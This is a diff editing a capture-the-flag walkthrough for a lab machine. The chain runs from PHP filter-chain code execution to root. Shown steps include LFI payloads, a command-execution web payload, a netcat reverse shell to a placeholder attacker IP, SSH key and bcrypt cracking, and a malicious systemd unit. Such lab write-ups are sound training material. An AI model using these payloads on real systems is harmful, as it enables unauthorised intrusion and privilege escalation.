@@ -14,9 +14,9 @@ A `page` parameter reading local files is escalated into full code execution usi
 
 ## Enumeration
 
-### Port Scanning
+### Port Enumeration
 
-A full TCP port scan is run first:
+A full TCP port scan comes first:
 
 ```bash
 $ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn northwing.nyx
@@ -27,7 +27,7 @@ PORT   STATE SERVICE REASON
 MAC Address: 08:00:27:37:2D:F4 (Oracle VirtualBox virtual NIC)
 ```
 
-Two ports are found open: **22 (SSH)** and **80 (HTTP)**. A version/script scan against both fills in the details:
+Two ports come back open: **22 (SSH)** and **80 (HTTP)**. A version and script scan on both fills in the details:
 
 ```bash
 $ sudo nmap -p 22,80 -sVC northwing.nyx
@@ -51,9 +51,10 @@ The main page:
 ```
 http://northwing.nyx
 ```
+
 <img src="../Images/northwing/Pasted image 20260708163651.png"/>
 
-A content discovery scan is run against the site:
+A content discovery scan runs against the site:
 
 ```bash
 $ ffuf -u http://northwing.nyx/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic
@@ -68,7 +69,10 @@ index.php              [Status: 200, Size: 6447, Words: 1460, Lines: 131, Durati
 server-status          [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 11ms]
 :: Progress: [882188/882188] :: Job [1/1] :: 3448 req/sec :: Duration: [0:05:31] :: Errors: 0 ::
 ```
+
 <img src="../Images/northwing/Pasted image 20260708163756.png"/>
+
+The site drives its content through a `page` parameter, which immediately raises the question of what else it can be pointed at:
 
 > **Endpoint:** `http://northwing.nyx/?page=`
 
@@ -76,11 +80,12 @@ server-status          [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 
 
 ### Local File Inclusion → PHP Filter Chain RCE
 
-The `page` parameter reads local files. `php://filter` with a base64-encode step confirms it, dumping the app's own source instead of letting it execute as PHP:
+The `page` parameter reads local files. A `php://filter` with a base64-encode step confirms it, dumping the app's own source instead of letting it execute as PHP:
 
 ```
 http://northwing.nyx/?page=php://filter/convert.base64-encode/resource=index.php
 ```
+
 <img src="../Images/northwing/Pasted image 20260708163850.png"/>
 
 A read-only file inclusion can be pushed further with PHP filter chains: stacking `iconv` conversions repeatedly mutates a file's bytes in-memory, and with enough of them chained together, arbitrary content — including working PHP — can be produced from data that was never written to disk. `php_filter_chain_generator.py` automates building that chain for a given payload. A first pass targets `phpinfo()` just to confirm code execution:
@@ -88,28 +93,30 @@ A read-only file inclusion can be pushed further with PHP filter chains: stackin
 ```bash
 $ ./php_filter_chain_generator.py --chain '<?php phpinfo();?>'
 ```
+
 <img src="../Images/northwing/Pasted image 20260708163926.png"/>
 
 ```
 http://northwing.nyx/?page=php://filter/convert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7C...
 ```
+
 <img src="../Images/northwing/Pasted image 20260708164128.png"/>
 
-With execution confirmed, a second chain is generated for a payload that runs whatever command is passed in a GET parameter:
+With execution confirmed, a second chain carries a payload that runs whatever command is passed in a GET parameter:
 
 ```bash
 $ ./php_filter_chain_generator.py --chain '<?=`$_GET[0]`?>'
 ```
+
 <img src="../Images/northwing/Pasted image 20260708164001.png"/>
 
 ```
 http://northwing.nyx/?0=id&page=php://filter/convert.iconv.UTF8.CSISO2022KR[....]
 ```
+
 <img src="../Images/northwing/Pasted image 20260708164203.png"/>
 
-
-
-The same technique is used to get a reverse shell instead of a one-off command:
+The same technique gets a reverse shell instead of a one-off command:
 
 ```
 http://northwing.nyx/?0=busybox%20nc%20<ATTACKER_IP>%20<PORT>%20-e%20/bin/bash&page=php://filter/convert.iconv.UTF8.[....]
@@ -127,7 +134,7 @@ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data),1000(arthur)
 ```
 
-The shell is upgraded to something usable:
+A quick pty upgrade makes the shell usable:
 
 ```bash
 python3 -c 'import pty; pty.spawn ("/bin/bash")'
@@ -150,13 +157,15 @@ www-data@northwing:/var/www/html$ cat /home/arthur/user.txt
 5f4dcc3b5aa765d61d8327deb882cf99
 ```
 
-`www-data`'s secondary group membership in `arthur` is what makes that last read possible, even without a shell as `arthur` yet.
+Note the `1000(arthur)` secondary group on `www-data` — that membership is what makes reading `arthur`'s `user.txt` possible without a shell as `arthur` yet.
 
 > **User flag:** `5f4dcc3b5aa765d61d8327deb882cf99`
 
 ## Lateral Movement
 
 ### Cracking arthur's SSH Key
+
+That same group access reaches into `arthur`'s `.ssh` directory, where the private key is world-readable:
 
 ```bash
 www-data@northwing:/tmp$ ls -la /home/arthur/
@@ -192,7 +201,7 @@ RcEjFmh3yjBSD5VRJKziDZHl6hqN3rukCxS2Y=
 www-data@northwing:/tmp$
 ```
 
-The private key is passphrase-protected. It's copied out locally as `arthur_rsa` and cracked with `john`:
+The private key is passphrase-protected. Copied out locally as `arthur_rsa`, `ssh2john` extracts the hash and `john` cracks it:
 
 ```bash
 $ chmod 600 arthur_rsa
@@ -221,7 +230,7 @@ $ ssh arthur@northwing.nyx -i arthur_rsa
 
 ### Database Credentials in Source
 
-With a foothold as `arthur`, the web app's own source is checked for anything useful:
+With a foothold as `arthur`, the web app's own source is worth checking for anything useful:
 
 ```bash
 arthur@northwing:/tmp$ ls -l /var/www/html/internal_app/connection.php
@@ -245,6 +254,8 @@ if ($conn->connect_error) {
 
 ### Cracking Database Hashes
 
+Those credentials open the MySQL instance, where the `users` table holds password hashes:
+
 ```bash
 arthur@northwing:/tmp$ mysql -u northwing -p
 mysql> SHOW databases;
@@ -252,6 +263,7 @@ mysql> USE northwing;
 mysql> SHOW tables;
 mysql> SELECT * FROM users;
 ```
+
 <img src="../Images/northwing/Pasted image 20260708164822.png"/>
 
 Two password hashes come back:
@@ -260,7 +272,7 @@ Two password hashes come back:
 
 > **Developer's hash:** `$2a$12$6n7/juND57eFUlODfeB87e45x24ibPr4eiZPLmKKIA84YKsj3fvGq`
 
-The `developer` hash is run against `rockyou.txt`:
+The `developer` hash goes against `rockyou.txt`:
 
 ```bash
 $ john developer_db /usr/share/wordlists/rockyou.txt --format=bcrypt
@@ -300,7 +312,7 @@ User developer may run the following commands on northwing:
 
 ### Sudo `systemctl` → Malicious Service
 
-The `sudo -l` output above shows `developer` can run `systemctl` as root with any arguments (`NOPASSWD: /usr/bin/systemctl *`) — enough to register and start an arbitrary unit file. A malicious systemd unit is created, set to run a command as soon as it starts:
+The `sudo -l` output above shows `developer` can run `systemctl` as root with any arguments (`NOPASSWD: /usr/bin/systemctl *`) — enough to register and start an arbitrary unit file. A malicious systemd unit sets `chmod u+s /bin/bash` to run the moment it starts:
 
 ```bash
 developer@northwing:/tmp$ echo '[Service]
@@ -319,6 +331,8 @@ developer@northwing:/tmp$ sudo systemctl enable --now /tmp/malicious.service
 Created symlink /etc/systemd/system/multi-user.target.wants/malicious.service → /tmp/malicious.service.
 developer@northwing:/tmp$ bash -p
 ```
+
+With the SUID bit set, `bash -p` keeps root's privileges instead of dropping them:
 
 ```bash
 bash-5.2# id
